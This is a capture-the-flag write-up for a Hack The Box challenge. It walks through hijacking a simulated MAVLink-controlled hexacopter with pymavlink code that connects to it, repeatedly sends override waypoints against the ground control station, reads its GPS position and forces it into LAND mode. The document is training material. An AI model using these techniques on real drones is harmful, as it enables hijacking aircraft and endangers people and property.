![img](../../assets/banner.png)

<img src='../../assets/htb.png' style='zoom: 80%;' align=left /> <font size='10'>
Sky Recon
</font>

30<sup>th</sup> Apr 2025

Prepared By: `0xSn4k3000`

Challenge Author(s): `0xSn4k3000`

Difficulty: <font color='green'>medium</font>

<br><br>

# Synopsis (!)

- Remote exploitation of MAVLink protocol for UAV command manipulation
- Real-time GPS position monitoring through GLOBAL_POSITION_INT messages
- Forced mode transition to LAND using MAV_CMD_DO_SET_MODE

## Description (!)

- Volnayan operatives deployed a surveillance drone use MAVLink in our territory. It's transmitting intel back to enemy command. Intercept and take control before critical defense assets and covert operations are exposed.

## Skills Required (!)

- Knowledge of mavlink protocol
- Knowledge of programming drones
- Basics knowledge of flying drones

# Solution (!)

## Step 1: Understanding the Target

We begin by reviewing the provided mission briefing PDF, which outlines critical information about our objective. Our target is a hexacopter drone—a six-rotor UAV (Unmanned Aerial Vehicle) — currently operating within our airspace. This drone is controlled remotely by a Ground Control Station (GCS) utilizing the MAVLink protocol.​

MAVLink (Micro Air Vehicle Link) is a lightweight, header-only messaging protocol designed for communication between drones and ground stations. It facilitates the exchange of telemetry data, command and control messages, and system status updates between the drone and its controller.

When we access the provided web page where we can view the drone along with its real-time telemetry data. We observe that the drone is operating in GUIDED mode. This mode allows the drone to receive and execute navigation commands in real-time from its Ground Control Station (GCS). In GUIDED mode, the drone can be directed to specific waypoints or instructed to perform particular maneuvers without the need for a pre-programmed mission. This flexibility enables dynamic control over the drone's flight path, allowing operators to respond to changing mission requirements or environmental conditions.

Since the drone is being controlled in real time, we can't simply open a GCS like `mavproxy` and issue a `guided LAT LON ALTITUDE` command to redirect it to the base—any such attempt would likely be overridden immediately by the active operator, who could just adjust the flight path and continue the mission.

Additionally, we can't unlink the primary MAVLink client—in this case, the GCS—so our only available option is to continuously send override waypoint commands directing the drone to our base.

## Step 2: Sending Override Waypoint Commands

We can easily interact with the MAVLink protocol in Python using the pymavlink library, which provides a convenient interface for crafting and sending commands.

### Connecting to the Drone

```python
from pymavlink import mavutil

def connect_to_vehicle():
    print("Connecting to vehicle...")
    vehicle = mavutil.mavlink_connection("tcp:IP:PORT")
    vehicle.wait_heartbeat()
    print(f"Heartbeat from system (system {vehicle.target_system} component {vehicle.target_component})")
    return vehicle
```

This function uses the `pymavlink` library to establish a TCP connection to a drone via a specified IP address and port (e.g., "tcp:192.168.1.10:5760"). It creates a MAVLink connection using mavutil.mavlink_connection, then waits for a `heartbeat` message—`an automatic signal sent periodically by MAVLink devices to indicate they are active and responsive`. Receiving this heartbeat confirms that the drone is connected and ready for communication. Once received, the function prints the system and component IDs of the drone and returns the connection object for further MAVLink interaction.

### Send waypoint

```python
def send_waypoint(vehicle, lat, lon, alt):
    print(f"Sending waypoint: {lat:.6f}, {lon:.6f}, {alt}m")
    vehicle.mav.mission_item_send(
        vehicle.target_system,
        vehicle.target_component,
        0,  # seq
        mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT,
        mavutil.mavlink.MAV_CMD_NAV_WAYPOINT,
        2,  # current - set to current waypoint
        1,  # autocontinue
        0, 0, 0, 0,  # param1-4
        lat, lon, alt
    )
```

This calls the `mission_item_send` method on the vehicle's MAVLink connection to send the waypoint command

- `vehicle.target_system` and `vehicle.target_component` specify which system and component on the drone should receive this command
- `0` is the sequence number of the waypoint (position in the mission)
- `MAV_FRAME_GLOBAL_RELATIVE_ALT` specifies that coordinates are global (`lat/lon`) and altitude is relative to the home position
- `MAV_CMD_NAV_WAYPOINT` is the MAVLink command type for a simple waypoint
- `2` indicates this should be set as the current waypoint to navigate to immediately
- `1` means autocontinue to the next waypoint after reaching this one
- The `0, 0, 0, 0` are command-specific parameters (unused for a basic waypoint)
- Finally, `lat`, `lon`, and `alt` are the coordinates passed to the function

So using this function we can make the drone navigate to our base imediatly,
From the pdf we know that the base is on `-35.36276,149.165771`

```python
lon = 149.165771
lat = -35.36276
alt = 90

send_waypoint(uav, lat=lat, lon=lon, alt=alt)
```

After trying this, we notice that the drone begins moving toward the base, then returns after a short while. At least now we know the system is working. Next, we can start looping and set a waypoint every 2 seconds.

```python
lon = 149.165771
lat = -35.36276
alt = 90

while True:
    send_waypoint(uav, lat=lat, lon=lon, alt=alt)
    sleep(2)
```

## Step 3: Landing the Drone

Once we reach the base, we'll need to land the drone there. When entering the base area, you'll notice there's no longer any resistance from the GCS. This is likely due to the jammer, which disrupts communication and prevents the GCS from overriding our commands. Even if you stop sending waypoints, the drone will hover steadily in place.

So it's time to land the drone.

```python
def land(vehicle):
    vehicle.mav.set_mode_send(
        vehicle.target_system,
        mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        vehicle.mode_mapping()["LAND"]
    )
```

By simply switching the flight mode to `LAND`, the system will automatically handle the landing procedure.

### Getting drone location

Once we reach the base, we can initiate the landing sequence. However, before doing so, we need to determine whether we’ve actually arrived at the base location.

#### Retrieving the Current Position

```python
def get_current_position(vehicle):
    print(f"Trying to get position from GLOBAL_POSITION_INT...")
    msg = vehicle.recv_match(type="GLOBAL_POSITION_INT", blocking=True, timeout=3)
    if msg:
        print(f"Received GLOBAL_POSITION_INT message")

        lat = msg.lat / 1e7
        lon = msg.lon / 1e7
        alt = msg.relative_alt / 1000.0
        return lat, lon, alt
```

This function listens for a MAVLink message of type GLOBAL_POSITION_INT, which contains GPS coordinates and altitude data.

- `type="GLOBAL_POSITION_INT"`: Specifies the message type for position data.
- `blocking=True`: The function will wait until a matching message is received.
- `timeout=3`: If no message arrives within 3 seconds, the function returns None.

**Extracting and Converting Position Data**

The raw MAVLink values must be converted to standard units:

- **Latitude** (`lat`) → `msg.lat / 1e7`
  - MAVLink stores latitude in degrees \* 10,000,000 (integers).
  - Dividing by `1e7` converts it to standard decimal degrees (e.g., `47.1234567`).
- **Longitude** (`lon`) → `msg.lon / 1e7`
  - Same scaling as latitude.
- **Altitude** (`alt`) → `msg.relative_alt / 1000.0`
  - MAVLink sends altitude in millimeters (relative to home position).
  - Dividing by `1000` converts it to meters.

#### Requesting Position Data Stream

Before calling `get_current_position()`, we need to ensure that the drone is actively sending position data. This is done using the following function:

```python
def request_position_data(vehicle):
    print("Explicitly requesting position data...")
    # Send a request for position information
    vehicle.mav.request_data_stream_send(
        vehicle.target_system,
        vehicle.target_component,
        mavutil.mavlink.MAV_DATA_STREAM_POSITION,
        10,  # 10 Hz update rate
        1    # Start sending
    )
    # Wait a moment for data to start flowing
    sleep(1)
    # Now try to get position
    return get_current_position(vehicle)
```

This function sends a request to begin transmitting position updates at a frequency of `10 Hz`. After a brief delay to allow the stream to initialize, it then calls `get_current_position()` to retrieve the latest position data.

#### Checking If the Drone Has Reached the Base

Now that we have a working function to retrieve the drone's current position, we can use it to determine whether the drone is within the base area.

The exact coordinates of the base are approximately `(-35.3628163, 149.1640651)`. For simplicity, we can define the surrounding base area as approximately `(-35.362, 149.164)`. To perform a basic proximity check, we can truncate the current GPS coordinates and compare them to this reference point.

This allows us to implement a lightweight function that checks whether the drone is "close enough" to the base without requiring precise geofencing or distance calculations.

```python
def positions_close(lat1, lon1, lat2, lon2, decimal_places=3):

    def truncate(f, n):
        factor = 10.0 ** n
        return math.trunc(f * factor) / factor

    return truncate(lat1, decimal_places) == truncate(lat2, decimal_places) and \
           truncate(lon1, decimal_places) == truncate(lon2, decimal_places)
```

This function checks if two geographic coordinates (latitude and longitude) are approximately the same up to a specified decimal precision.

```python
lon = 149.165771
lat = -35.36276
alt = 90

cur_lat, cur_lon, cur_alt = request_position_data(uav)
print(f"[+] Current location: {cur_lat}, {cur_lon}")

if cur_lon != None and cur_lat != None:
    print("[*] Checking if reached the base...")
    if positions_close(cur_lat, cur_lon, lat, lon):
        print("[+] Reached target")
        print("Landing...")
        land(uav)
        break
```

Now we can determine if the UAV is approximately close enough to the base to initiate the `land()` function.
Once the UAV has landed, the flag will be revealed on the web page.

#### Handling Special Cases

In some situations, the MAVLink data stream may experience delays or fail to transmit timely updates. If you’re unable to retrieve the current GPS location when the UAV is near the base, you can still proceed with landing by either:

- Running a simple script that directly calls the `land()` function, or
- Manually switching the UAV to `LAND` mode using MAVProxy Ground Control Station (GCS).

Since we already have a `land()` function in our code, let’s explore the second option for manual control.

First, stop your current script, then launch MAVProxy by connecting to your UAV:

```bash
mavproxy.py --master=tcp:IP:PORT
```

Once connected and at the GUIDED> prompt, switch the flight mode to `LAND`:

```bash

GUIDED> mode land
GUIDED> Got COMMAND_ACK: DO_SET_MODE: ACCEPTED
LAND> Mode LAND
```

This will initiate the landing sequence manually, allowing you to recover the UAV even if automatic location detection fails.
